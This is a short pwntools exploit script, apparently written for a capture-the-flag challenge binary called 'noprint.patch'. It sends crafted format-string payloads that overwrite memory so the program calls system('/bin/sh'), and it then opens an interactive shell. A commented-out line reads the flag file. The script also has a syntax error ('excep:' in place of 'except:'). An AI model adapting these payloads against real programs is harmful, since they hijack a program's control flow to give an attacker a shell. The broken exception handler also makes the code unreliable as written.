from pwn import *

vuln="./noprint.patch"

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

libc_path = "./libc.so.6"
libc = ELF(libc_path)
log.success(libc.symbols["system"])
log.success(libc.symbols["__libc_start_call_main"])

def ddebug(io, b=""):
    gdb.attach(io, gdbscript=b)
    pause()


def exec(io):
    try:
        io.sendline(b"%*7$c%64656c%11$hn")
        sleep(1)
        # ddebug(io)
        io.sendline(b"/bin/sh #%*12$c%199580c%31$n")
        sleep(1)
        # io.sendline(b"cat ./flag")
        io.interactive()
    excep:
        pass



io=process([vuln])
exec(io)
# while True:
#     io=process([vuln])
#     sleep(1)
#     exec(io)
#     io.close()
